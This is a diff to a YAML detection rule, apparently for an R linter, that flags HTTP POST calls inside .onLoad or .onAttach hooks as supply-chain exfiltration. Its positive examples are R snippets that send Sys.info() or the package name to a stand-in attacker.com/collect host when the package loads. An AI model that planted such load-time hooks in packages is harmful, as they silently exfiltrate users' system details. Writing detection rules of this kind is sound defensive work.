@@ -5,27 +5,68 @@ attck:
   - T1041
   - T1195.002
 message: >-
-  httr::POST() inside .onLoad or .onAttach sends an outbound HTTP POST request
-  automatically at package load time.
+  A POST request inside .onLoad or .onAttach sends an outbound HTTP request
+  automatically when a package is loaded. Matches httr::POST(), unqualified
+  POST() (e.g. after importFrom(httr, POST)), and httr::VERB().
 description: >-
-  Flag httr::POST() calls inside .onLoad or .onAttach.
+  Flag POST() calls (qualified as httr::POST() or unqualified) and httr::VERB()
+  calls inside .onLoad or .onAttach. Matches assignments using <-, =, or ->
+  so that all syntactically valid definition forms are covered.
 xpath: >-
-  //expr[
-    LEFT_ASSIGN
-    and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
-    and expr[FUNCTION][
-      .//expr[
-        SYMBOL_PACKAGE[text() = 'httr']
-        and NS_GET
-        and SYMBOL_FUNCTION_CALL[text() = 'POST']
+  (//expr | //expr_or_assign_or_help)[
+    (
+      (LEFT_ASSIGN or EQ_ASSIGN)
+      and expr[1]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[FUNCTION][
+        .//SYMBOL_FUNCTION_CALL[text() = 'POST']
+        or .//expr[
+          SYMBOL_PACKAGE[text() = 'httr']
+          and NS_GET
+          and SYMBOL_FUNCTION_CALL[text() = 'VERB']
+        ]
       ]
-    ]
+    )
+    or
+    (
+      RIGHT_ASSIGN
+      and expr[2]/SYMBOL[text() = '.onLoad' or text() = '.onAttach']
+      and expr[1][
+        .//SYMBOL_FUNCTION_CALL[text() = 'POST']
+        or .//expr[
+          SYMBOL_PACKAGE[text() = 'httr']
+          and NS_GET
+          and SYMBOL_FUNCTION_CALL[text() = 'VERB']
+        ]
+      ]
+    )
   ]
-example_positive: |
-  .onLoad <- function(libname, pkgname) {
-    httr::POST("https://attacker.com/collect", body = list(host = Sys.info()))
-  }
-example_negative: |
-  .onLoad <- function(libname, pkgname) {
-    packageStartupMessage("Package loaded.")
-  }
+example_positive:
+  - |
+    .onLoad <- function(libname, pkgname) {
+      httr::POST("https://attacker.com/collect", body = list(host = Sys.info()))
+    }
+  - |
+    .onAttach <- function(libname, pkgname) {
+      httr::POST("https://attacker.com/collect", body = list(pkg = pkgname))
+    }
+  - |
+    .onLoad <- function(libname, pkgname) {
+      POST("https://attacker.com/collect", body = list(host = Sys.info()))
+    }
+  - |
+    .onLoad = function(libname, pkgname) {
+      httr::POST("https://attacker.com/collect", body = list(user = Sys.info()))
+    }
+  - |
+    (function(libname, pkgname) {
+      httr::POST("https://attacker.com/collect", body = list(host = Sys.info()))
+    }) -> .onAttach
+example_negative:
+  - |
+    send_data <- function(url, data) {
+      httr::POST(url, body = data)
+    }
+  - |
+    .onUnload <- function(libpath) {
+      httr::POST("https://example.com/unloaded")
+    }
